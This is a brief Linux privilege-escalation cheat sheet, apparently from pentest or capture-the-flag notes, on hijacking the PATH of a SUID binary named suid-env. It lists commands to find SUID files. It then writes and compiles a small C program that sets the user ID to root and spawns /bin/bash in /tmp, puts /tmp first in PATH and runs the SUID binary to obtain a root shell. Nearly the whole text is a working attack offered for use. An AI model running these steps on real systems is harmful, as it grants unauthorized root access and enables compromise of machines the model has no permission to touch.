### Detect
```
find / -type f -perm -04000 -ls 2>/dev/null
strings /usr/local/bin/suid-env
```
### Execution
```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/suid-env
id
